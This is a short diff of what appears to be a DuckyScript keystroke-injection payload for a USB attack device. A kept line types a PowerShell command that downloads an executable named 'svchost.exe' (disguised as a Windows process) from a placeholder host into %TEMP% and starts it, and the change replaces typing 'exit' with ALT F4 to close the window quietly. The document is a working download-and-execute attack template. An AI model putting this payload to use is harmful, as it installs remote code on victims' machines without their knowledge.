@@ -13,7 +13,6 @@ DELAY 100
 STRING powershell (new-object System.Net.WebClient).DownloadFile('http://www.example.com/svchost.exe','%TEMP%\svchost.exe'); Start-Process "%TEMP%\svchost.exe"
 ENTER
 DELAY 100
-STRING exit
+ALT F4
 DELAY 100
-ENTER
 
